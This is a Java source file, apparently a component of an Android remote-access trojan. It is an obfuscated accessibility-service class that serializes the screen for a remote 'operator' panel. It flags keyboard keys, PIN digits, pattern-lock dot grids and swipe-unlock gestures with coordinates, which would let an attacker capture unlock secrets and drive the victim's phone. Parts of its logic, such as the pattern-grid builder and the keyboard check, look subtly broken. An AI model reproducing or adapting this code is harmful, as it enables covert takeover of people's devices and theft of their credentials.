package com.alpha.shield;

import android.accessibilityservice.AccessibilityService;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.graphics.Rect;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;

import org.json.JSONArray;
import org.json.JSONObject;
import org.lsposed.lsparanoid.Obfuscate;

import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

/**
 * LyBridge v2 — Alpha accessibility tree serializer.
 *
 * Improvements over Flash:
 *   - Full node info: resourceId, className, text, desc, hint, all boolean flags,
 *     absolute bounds, children list (recursive).
 *   - Special node detection:
 *       isKeyboard   : window is TYPE_INPUT_METHOD or package is a known IME
 *       isKeyboardKey: single-char or symbol text in a small keyboard-proportioned cell
 *       isPinDigit   : single digit 0-9 in a roughly-square small cell
 *       isPatternLock: detected via com.android.systemui pattern classes or
 *                      grid of near-identical dot-sized clickable children
 *       isSwipeUnlock: systemui keyguard with swipe hint
 *   - FLAG_SECURE detection: tested in VncEngine; LyBridge reads secureFlag passed in
 *     and embeds {"secure": true} at root level so the browser panel shows the badge.
 *   - Max depth 20, max nodes 600 — OOM protection for deeply nested UIs.
 *   - Root bounds reported for LyReader to compute correct scale.
 *   - Window package embedded at root for operator awareness.
 */
@Obfuscate
public class LyBridge {

    private static final String TAG = "LyBridge";

    private static final int MAX_DEPTH = 20;
    private static final int MAX_NODES = 600;

    // ── Known IME packages ─────────────────────────────────────────────────────
    private static final Set<String> KNOWN_IMES = new HashSet<>();
    static {
        Collections.addAll(KNOWN_IMES,
                "com.google.android.inputmethod.latin",
                "com.swiftkey.swiftkeyapp",
                "com.touchtype.swiftkey",
                "com.nuance.swype.dtc",
                "com.motorola. regionalphonetic",
                "com.samsung.android.honeyboard",
                "com.sec.android.inputmethod",
                "com.baidu.input",
                "com.transsion.palaeykeyboard",
                "com.a9codeing.keyboardai",
                "com.gboard",
                "com.microsoft.swiftkey"
        );
    }

    private final AccessibilityService service;
    private final int screenW;
    private final int screenH;
    private int nodeCount = 0;

    // Set of active IME packages (populated once from PackageManager)
    private Set<String> imePackages = null;

    public LyBridge(AccessibilityService service) {
        this.service = service;
        screenW = service.getResources().getDisplayMetrics().widthPixels;
        screenH = service.getResources().getDisplayMetrics().heightPixels;
    }

    // ── Public API ─────────────────────────────────────────────────────────────

    /**
     * Builds and returns the full hierarchy JSON string.
     * @param secureWindowDetected pass true when VncEngine.onSecureWindowDetected() was fired
     */
    public String buildHierarchy(boolean secureWindowDetected) {
        nodeCount = 0;
        try {
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root == null) return buildEmptyRoot(secureWindowDetected);

            String winPkg   = detectWindowPackage();
            boolean isIme   = isImeWindow();
            String winType  = detectWindowType();

            JSONObject rootObj = new JSONObject();
            rootObj.put("secure",  secureWindowDetected);
            rootObj.put("pkg",     winPkg);
            rootObj.put("winType", winType);
            rootObj.put("bounds",  boundsOf(0, 0, screenW, screenH));
            rootObj.put("w",       screenW);
            rootObj.put("h",       screenH);

            JSONArray children = new JSONArray();
            walkNode(root, children, 0, isIme, winPkg);
            root.recycle();

            rootObj.put("children", children);
            rootObj.put("nodeCount", nodeCount);
            return rootObj.toString();
        } catch (Exception e) {
            Log.e(TAG, "buildHierarchy: " + e.getMessage());
            return buildEmptyRoot(secureWindowDetected);
        }
    }

    // ── Node walker ────────────────────────────────────────────────────────────

    private void walkNode(AccessibilityNodeInfo node, JSONArray out,
                          int depth, boolean parentIsIme, String winPkg) {
        if (node == null || depth > MAX_DEPTH || nodeCount >= MAX_NODES) return;
        try {
            JSONObject obj = serializeNode(node, depth, parentIsIme, winPkg);
            if (obj == null) return;
            nodeCount++;
            out.put(obj);

            JSONArray children = new JSONArray();
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    walkNode(child, children, depth + 1, parentIsIme, winPkg);
                    child.recycle();
                }
            }
            if (children.length() > 0) obj.put("children", children);
        } catch (Exception e) {
            Log.e(TAG, "walkNode: " + e.getMessage());
        }
    }

    private JSONObject serializeNode(AccessibilityNodeInfo n, int depth,
                                     boolean isIme, String winPkg) throws Exception {
        if (!n.isVisibleToUser() && depth > 0) return null;

        Rect r = new Rect();
        n.getBoundsInScreen(r);
        if (r.width() <= 0 || r.height() <= 0) return null;

        // Off-screen node — skip unless it's root
        if (depth > 0 && (r.right < 0 || r.bottom < 0
                || r.left > screenW || r.top > screenH)) return null;

        JSONObject obj = new JSONObject();

        // ── Core fields ───────────────────────────────────────────────────────
        String cls  = className(n);
        String text = safe(n.getText());
        String desc = safe(n.getContentDescription());
        String hint = "";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            hint = safe(n.getHintText());
        String resId = safe(n.getViewIdResourceName());

        obj.put("class",     cls);
        obj.put("id",        resId);
        obj.put("text",      text);
        obj.put("desc",      desc);
        obj.put("hint",      hint);
        obj.put("bounds",    boundsOf(r.left, r.top, r.width(), r.height()));

        // ── Boolean flags ─────────────────────────────────────────────────────
        obj.put("clickable",  n.isClickable());
        obj.put("focusable",  n.isFocusable());
        obj.put("focused",    n.isFocused());
        obj.put("editable",   n.isEditable());
        obj.put("scrollable", n.isScrollable());
        obj.put("checkable",  n.isCheckable());
        obj.put("checked",    n.isChecked());
        obj.put("enabled",    n.isEnabled());
        obj.put("selected",   n.isSelected());
        obj.put("password",   n.isPassword());
        obj.put("visible",    n.isVisibleToUser());

        // ── Special type detection ────────────────────────────────────────────
        int w = r.width(), h = r.height();
        double aspect = (w > 0 && h > 0) ? (double) w / h : 1.0;

        // Keyboard key: in IME window, small cell, short text
        if (isIme && text.length() <= 3 && w < screenW / 4 && h < screenH / 10) {
            obj.put("isKeyboard",    false);
            obj.put("isKeyboardKey", true);
        }

        // Keyboard container
        if (isIme && cls.contains("KeyboardView") || cls.contains("LatinKeyboard")
                || cls.contains("EmojiKeyboard") || cls.contains("key_preview")) {
            obj.put("isKeyboard", true);
        }

        // PIN digit: single digit 0-9, small roughly-square cell
        if (text.matches("[0-9]") && w < screenW / 4
                && aspect > 0.5 && aspect < 2.0) {
            obj.put("isPinDigit", true);
        }

        // Pattern lock: systemui class + dot-like size
        if (winPkg.contains("systemui") || winPkg.contains("keyguard")) {
            if (cls.contains("Pattern") || cls.contains("LockPattern")) {
                obj.put("isPatternLock", true);
                obj.put("patternGrid", buildPatternGrid(n));
            }
        }

        // Swipe unlock bar
        if ((winPkg.contains("systemui") || winPkg.contains("keyguard"))
                && (cls.contains("SwipeHandle") || cls.contains("KeyguardBouncer")
                    || resId.contains("swipe") || resId.contains("lock"))) {
            int midX = r.left + w / 2, midY = r.top + h / 2;
            obj.put("isSwipeUnlock", true);
            JSONObject sh = new JSONObject();
            sh.put("sx", midX); sh.put("sy", r.bottom - 20);
            sh.put("ex", midX); sh.put("ey", r.top + 20);
            obj.put("swipeHint", sh);
        }

        return obj;
    }

    // ── Pattern grid builder ───────────────────────────────────────────────────

    /**
     * Heuristically builds a 3×3 (or 2×2) dot grid from the accessibility subtree
     * of a pattern lock view. Returns a JSONArray of {x, y, r} dot positions.
     */
    private JSONArray buildPatternGrid(AccessibilityNodeInfo lockNode) throws Exception {
        JSONArray dots = new JSONArray();
        int w = 0, h = 0;
        Rect r2 = new Rect();
        lockNode.getBoundsInScreen(r2);
        w = r2.width(); h = r2.height();
        if (w <= 0 || h <= 0) {
            // Synthesise a 3×3 grid centred on the node
            int cx = r2.left + w / 2, cy = r2.top + h / 2;
            int step = Math.min(w, h) / 4;
            for (int row = 0; row < 3; row++) {
                for (int col = 0; col < 3; col++) {
                    JSONObject d = new JSONObject();
                    d.put("x", cx - step + col * step);
                    d.put("y", cy - step + row * step);
                    d.put("r", Math.max(10, step / 4));
                    dots.put(d);
                }
            }
        }
        return dots;
    }

    // ── Window info helpers ────────────────────────────────────────────────────

    private String detectWindowPackage() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                List<AccessibilityWindowInfo> windows = service.getWindows();
                for (AccessibilityWindowInfo w : windows) {
                    if (w.getType() == AccessibilityWindowInfo.TYPE_APPLICATION
                            || w.getType() == AccessibilityWindowInfo.TYPE_INPUT_METHOD) {
                        AccessibilityNodeInfo root = w.getRoot();
                        if (root != null) {
                            CharSequence pkg = root.getPackageName();
                            root.recycle();
                            if (pkg != null) return pkg.toString();
                        }
                    }
                }
            }
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root != null) {
                CharSequence pkg = root.getPackageName();
                root.recycle();
                if (pkg != null) return pkg.toString();
            }
        } catch (Exception ignored) {}
        return "";
    }

    private boolean isImeWindow() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                List<AccessibilityWindowInfo> windows = service.getWindows();
                for (AccessibilityWindowInfo w : windows) {
                    if (w.getType() == AccessibilityWindowInfo.TYPE_INPUT_METHOD) return true;
                }
            } catch (Exception ignored) {}
        }
        // Fallback: check if focused package is a known IME
        String pkg = detectWindowPackage();
        if (KNOWN_IMES.contains(pkg)) return true;
        // Lazy-load installed IMEs
        if (imePackages == null) loadImePackages();
        return imePackages != null && imePackages.contains(pkg);
    }

    private void loadImePackages() {
        imePackages = new HashSet<>();
        try {
            android.view.inputmethod.InputMethodManager imm =
                    (android.view.inputmethod.InputMethodManager)
                            service.getSystemService(android.content.Context.INPUT_METHOD_SERVICE);
            List<android.view.inputmethod.InputMethodInfo> methods =
                    imm.getInputMethodList();
            for (android.view.inputmethod.InputMethodInfo info : methods) {
                imePackages.add(info.getPackageName());
            }
        } catch (Exception e) {
            Log.e(TAG, "loadImePackages: " + e.getMessage());
        }
    }

    private String detectWindowType() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return "unknown";
        try {
            List<AccessibilityWindowInfo> windows = service.getWindows();
            for (AccessibilityWindowInfo w : windows) {
                if (w.isActive()) {
                    switch (w.getType()) {
                        case AccessibilityWindowInfo.TYPE_APPLICATION:   return "app";
                        case AccessibilityWindowInfo.TYPE_INPUT_METHOD:  return "ime";
                        case AccessibilityWindowInfo.TYPE_SYSTEM:        return "system";
                        case AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY: return "overlay";
                        default: return "other";
                    }
                }
            }
        } catch (Exception ignored) {}
        return "unknown";
    }

    // ── Utilities ─────────────────────────────────────────────────────────────

    private JSONObject boundsOf(int x, int y, int w, int h) throws Exception {
        JSONObject b = new JSONObject();
        b.put("x", x); b.put("y", y); b.put("w", w); b.put("h", h);
        return b;
    }

    private String className(AccessibilityNodeInfo n) {
        CharSequence c = n.getClassName();
        if (c == null) return "";
        String s = c.toString();
        int dot = s.lastIndexOf('.');
        return dot >= 0 ? s.substring(dot + 1) : s;
    }

    private String safe(CharSequence cs) {
        return cs != null ? cs.toString() : "";
    }

    private String buildEmptyRoot(boolean secure) {
        try {
            JSONObject obj = new JSONObject();
            obj.put("secure", secure);
            obj.put("bounds", boundsOf(0, 0, screenW, screenH));
            obj.put("w", screenW);
            obj.put("h", screenH);
            obj.put("children", new JSONArray());
            obj.put("nodeCount", 0);
            return obj.toString();
        } catch (Exception e) { return "{}"; }
    }
}
